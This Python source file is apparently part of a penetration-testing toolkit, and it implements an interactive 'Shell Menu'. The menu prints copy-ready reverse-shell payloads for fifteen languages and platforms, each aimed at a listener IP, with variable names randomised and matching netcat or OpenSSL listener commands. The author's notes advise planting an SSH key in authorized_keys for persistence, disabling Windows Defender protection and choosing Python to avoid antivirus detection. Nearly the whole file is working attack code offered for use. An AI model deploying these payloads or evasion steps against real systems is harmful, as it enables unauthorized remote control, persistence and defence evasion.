#! /usr/bin/env python3

## Shell Help submenu
import  os
import importlib
from importlib import util


spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()

##Shells
def Shells():
  os.system("clear")
  #random ports
  rp1 = m.randomPort()
  rp2 = m.randomPort()
  rp3 = m.randomPort()
  rp4 = m.randomPort()
  rp5 = m.randomPort()
  rp6 = m.randomPort()
  rp7 = m.randomPort()
  rp8 = m.randomPort()
  rp9 = m.randomPort()
  rp10 = m.randomPort()
  rp11 = m.randomPort()
  rp12 = m.randomPort()
  rp13 = m.randomPort()
  rp14 = m.randomPort()
  rp15 = m.randomPort()

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tLets Play with some Shells!!" + m.bcolors.ENDC)
  while(1):
    print(m.bcolors.BOLD + m.bcolors.GREEN +"""
        *******************************************************************
          _   _   _   _   _     _   _   _   _  
         / \ / \ / \ / \ / \   / \ / \ / \ / \ 
        ( S | h | e | l | l ) ( M | e | n | u )
         \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
      """+ m.bcolors.ENDC)
    print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
    print("\t(1)\tBASH Reverse Shell --------- (Linux|Unix|Mac)")
    print("\t(2)\tPERL Reverse Shell --------- (Linux|Unix|Mac)")
    print("\t(3)\tPERL Reverse Shell --------- (Windows)")
    print("\t(4)\tPowerShell Reverse Shell --- (Windows)")
    print("\t(5)\tPython Reverse Shell ------- (Linx|Unix|Mac)")
    print("\t(6)\tPython Reverse Shell ------- (Windows)")
    print("\t(7)\tPHP Reverse Shell ---------- (Linux|Unix|Mac)")
    print("\t(8)\tRuby Reverse Shell --------- (Linux|Unix|Mac)")
    print("\t(9)\tRuby Reverse Shell --------- (Windows)")
    print("\t(10)\tGolang Reverse Shell ------- (Linux|Unix)")
    print("\t(11)\tAwk Reverse Shell ---------- (Linux|Unix)")
    print("\t(12)\tJava Reverse Shell --------- (Linux|Unix)")
    print("\t(13)\tJava Reverse Shell --------- (Windows)")
    print("\t(14)\tOpenSSL Shell -------------- (Linux|Unix|Mac)")
    print("\t(15)\tNetCat MAC Shell ----------- (Mac)")
    print("\t(99)\tGo back to the main menu")
    print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)

    options = input("\nPiCk a S4e11 bro-pop: ")

    if options == "1":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tBASH SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "bash -i >& /dev/tcp/" + m.listener_ip + "/{0} 0>&1\n\n".format(rp1))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tBASH Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp1))
        print("\t NOTE:\t  This consitently works. If there is a command injection on a linux based system, this is my go too.\n \t\t If the connection keeps getting dropped I would recommend adding a public key to the authorized_keys in the .ssh folder of the application's user\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "2":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Linux SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************")
        pN = m.randomString(8)
        iN = m.randomString(10)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + 'perl -e \'use Socket;$%s=\"' % iN + m.listener_ip + '\";$%s=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($%s,inet_aton($%s)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n' %(pN, rp2, pN, iN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Linux Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp2))
        print("\t NOTE:\t  This  works fine. However, I would use python if that is avalible to you\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "3":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Windows SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        cN = m.randomString(9)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + 'perl -MIO -e \'${0}=new IO::Socket::INET(PeerAddr,\"'.format(cN) + m.listener_ip + ':{0}\");STDIN->fdopen(${1},r);$~->fdopen($c,w);system$_ while<>;\'\n'.format(rp3, cN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPerl Windows Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp3))
        print("\t NOTE:\t  I would only use this on older boxes that do not have any other execution paths\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "4":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPowerShell Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        clientN = m.randomString(9)
        streamN = m.randomString(10)
        byteN = m.randomString(8)
        dataN = m.randomString(7)
        sendbackN = m.randomString(10)
        iN = m.randomString()
        sendback2N = m.randomString(9)
        sendbyteN = m.randomString(12)
        ps_script = "$" + clientN + " = \"New-Object System.Net.Sockets.TCPClient(\'" + m.listener_ip +  "\'," + rp4 + ")\";$" + streamN+" = $" + clientN + ".GetStream();[byte[]]$" + byteN + " = 0..65535|%{0};while(($" + iN + " = $" + streamN + ".Read($" + byteN + ", 0, $" + byteN + ".Length)) -ne 0){;$" + dataN + " = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($" + byteN + ",0, $" + iN + ");$" + sendbackN + " = (iex $" + dataN + " 2>&1 | Out-String );$" + sendback2N + " = $" + sendbackN + " + \'PS \' + (pwd).Path + \'> \';$" + sendbyteN + " = ([text.encoding]::ASCII).GetBytes($" + sendback2N + ");$" + streamN + ".Write($" + sendbyteN + ",0,$" + sendbyteN + ".Length);$" + streamN + ".Flush()};$" + clientN + ".Close()\n"
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + ps_script)
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPowerShell Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp4))
        print("\t NOTE:\t In newer versions of PowerShell AMSI will prevent this script from running. You will have to do one of two things: \n \t\t 1. If administrator disable it, with 'Set-MpPreference -DisableIOAVProtection $True' \n\t\t 2. Run the script in  verions 1 or 2 with the -v 1 or -v 2. .NET v2.0.50727 is required\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "5":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Linux Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        sN = m.randomString(8)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "python -c \'import socket,subprocess,os;{2}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);{2}.connect((\"{0}\",{1}));os.dup2({2}.fileno(),0); os.dup2({2}.fileno(),1);os.dup2({2}.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format(m.listener_ip, rp5, sN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp5))
        print("\t NOTE:\t  This is a go to shell if python is avalible\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "6":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Windows Reverse SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "python -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('%s', %s)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"" %(m.listener_ip, rp6))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp6))
        print("\t NOTE:\t This shell works both on Python3 and Python2. You will need to make sure that python is installed. Since python will not trip an AV\n\t (Only applicaton whitelisting will pervent) this is a great method to establish a shell when other things are being monitored.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "7":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPHP SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        sockN = m.randomString(10)
        procN = m.randomString(9)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "php -r \'${0}=fsockopen(\"".format(sockN) + m.listener_ip +  "\",{0});${2}=proc_open(\"/bin/sh -i\", array(0=>${1}, 1=>${1}, 2=>${1}),$pipes);\'\n".format(rp7, sockN, procN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tPHP Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp7))
        print("\t NOTE:\t This shell should be used if there is LFI or a place within a PHP application where you can create a file within the web root.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "8":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Linux SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        fN = m.randomString(12)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "ruby -rsocket -e \'{2}=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",{2},{2},{2})\'\n".format(m.listener_ip, rp8, fN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Linux Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp8))
        print("\t NOTE:\t This shell works fine. However, python is normally a better choice.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "9":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Windows SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        cN = m.randomString(8)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "ruby -rsocket -e \'%s=TCPSocket.new(\"" % cN + m.listener_ip  + "\",\"%s\");while(cmd=%s.gets);Open3.popen(cmd,\"r\"){|io|%s.print io.read}end\'\n" %(rp9, cN, cN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tRuby Windows Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp9))
        print("\t NOTE:\t This shell whould require ruby to be installed on the Windows box.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "10":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tGoLang Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + m.listener_ip  + ":%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n" % rp10)
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tGoLang Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp10))
        print("\t NOTE:\t This shell would only be used if nothing else is avaible and GoLang is.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "11":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tAwk Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "awk \'BEGIN {s = \"/inet/tcp/0/" + m.listener_ip + "/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n" % rp11)
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tAwk Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp11))
        print("\t NOTE:\t This shell would work great when you are on a linux box and the normal shell paths are blocked.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "12":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Linux Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        rN = m.randomString(10)
        pN = m.randomString(8)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + """
{2} = Runtime.getRuntime()
{3} = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
{3}.waitFor()
""".format(m.listener_ip, rp12, rN, pN))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp12))
        print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Linux. Things like Jinkens, etc..\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "13":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Windows Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")
        pN = m.randomString()
        sN = m.randomString()
        piN = m.randomString()
        peN = m.randomString()
        siN = m.randomString()
        poN = m.randomString()
        soN = m.randomString()
        payl = """
String host="%s";
int port=%s;
String cmd="cmd.exe";
""" %(m.listener_ip, rp13)
        payl += "Process " + pN + "=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket " + sN + "=new Socket(host,port);InputStream " + piN + "=" + pN + ".getInputStream()," + peN + "=" + pN + ".getErrorStream(), " + siN + "=" + sN + ".getInputStream();OutputStream " + poN + "=" + pN + ".getOutputStream()," + soN + "=" + sN + ".getOutputStream();while(!" + sN + ".isClosed()){while(" + piN + ".available()>0)" + soN + ".write(" + piN + ".read());while(" + peN + ".available()>0)" + soN + ".write(" + peN + ".read());while(" + siN + ".available()>0)" + poN + ".write(" + siN + ".read());" + soN + ".flush();" + poN + ".flush();Thread.sleep(50);try {" + pN + ".exitValue();break;}catch (Exception e){}};" + pN + ".destroy();" + sN + ".close();"

        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + payl)
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tJava Windows Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp13))
        print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Windows. Things like Jinkens, etc..\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "14":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tOpenSSL Reverse  SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************\n")

        fName = m.randomString()

        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + """
mkfifo /tmp/{2}; /bin/sh -i < /tmp/{2} 2>&1 | openssl s_client -quiet -connect {0}:{1} > /tmp/{2}; rm /tmp/{2}
""".format(m.listener_ip, rp14, fName))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tOpenSSL Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy listener: " + m.bcolors.ENDC + """
---Generate the certificates--- (Copy this first!)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

---Start the listener--- (Copy this second!)
openssl s_server -quiet -key key.pem -cert cert.pem -port %s
""" %(rp14))
        print("\t NOTE:\t This is a really cool shell method. It works great.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "15":
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tNetCat Mac SHELL\t\t***\n" + m.bcolors.ENDC)
        print("\t*******************************************************************")
        fifoName = m.randomString(8)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy payload: " + m.bcolors.ENDC + "mkfifo /tmp/{0}; nc {1} {2} </tmp/{0} | /bin/bash -i > /tmp/{0} 2>&1; rm /tmp/{0}".format(fifoName, m.listener_ip, rp15))
        print(m.bcolors.BOLD + m.bcolors.UNDERLINE + m.bcolors.GREEN + "***\t\tNetCat Mac Listener\t\t***\n" + m.bcolors.ENDC)
        print(m.bcolors.BLUE + m.bcolors.BOLD + "\tCopy NetCat listener: " + m.bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp15))
        print("\t NOTE:\t  This  works Great. NC is installed on MAC by default, however it does not support the -e flag so you have to use a fifo pipe file.\n")
        print("\t*******************************************************************\n")
        input("Press any key to go back to the menu!")
    elif options == "99":
        os.system("clear")
        break
    else:
       input("Go ahead and pick the shell you need!... ")

